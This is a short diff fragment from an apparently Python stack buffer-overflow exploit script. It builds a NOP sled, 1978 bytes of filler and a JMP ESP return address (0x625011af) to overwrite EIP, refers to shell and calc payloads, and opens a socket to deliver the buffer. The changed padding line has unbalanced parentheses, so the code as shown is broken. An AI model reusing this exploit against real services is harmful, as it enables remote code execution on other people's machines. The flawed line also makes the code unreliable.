@@ -69,7 +69,7 @@ payload_shell = (
 nop_sled = "\x90" * 16  # NOP Sled
 filler = "A" * 1978  # Filler 1978 Bytes + 10 Bytes Header
 eip = "\xaf\x11\x50\x62"    #0x625011af  Return Address JMP ESP
-extend = "\x90" * 32
+extend = "\x90" * (400 - (len(payload_calc) + (len(nop_sled)))
 
 try:
     s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
